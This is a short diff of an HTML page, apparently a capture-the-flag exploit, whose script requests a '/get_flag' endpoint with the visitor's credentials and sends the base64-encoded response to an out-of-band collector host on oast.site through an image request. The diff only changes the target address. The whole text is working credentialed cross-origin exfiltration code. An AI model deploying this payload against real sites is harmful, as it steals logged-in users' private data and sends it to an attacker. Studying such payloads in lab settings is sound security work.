@@ -2,7 +2,7 @@
 <html>
 <body>
 <script>
-fetch('http://34.134.162.213:17001/get_flag', { credentials: 'include' })
+fetch('http://127.0.0.1:3000/get_flag', { credentials: 'include' })
   .then(r => r.text())
   .then(data => {
     new Image().src = 'https://toetqx9cw60filn7a5fc93hyfph3qlp0w.oast.site/?flag=' + btoa(data);
